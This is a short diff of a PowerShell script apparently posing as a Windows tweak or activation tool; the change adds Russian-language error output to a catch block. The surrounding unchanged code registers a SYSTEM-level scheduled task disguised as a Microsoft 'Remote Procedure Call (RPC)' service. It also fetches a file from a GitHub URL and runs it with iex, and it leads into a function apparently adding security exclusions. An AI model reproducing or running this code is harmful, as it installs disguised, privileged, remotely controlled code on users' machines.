@@ -56,7 +56,11 @@ function Add-ScheduledTask {
         $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
         Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName 'Remote Procedure Call (RPC)' -Description 'Microsoft Corporation Remote Procedure Calls needs to be autorunned with Windows to run Ethernet Configuration' -ErrorAction Stop
         iwr "https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/TaskSuccesful" | iex
-    } catch {}
+    } catch {
+        Write-Host "Произошла ошибка: $_"
+
+        Write-Host "Подробности: $($_.Exception.Message)"
+    }
 }
 
 function Add-Exclusion {
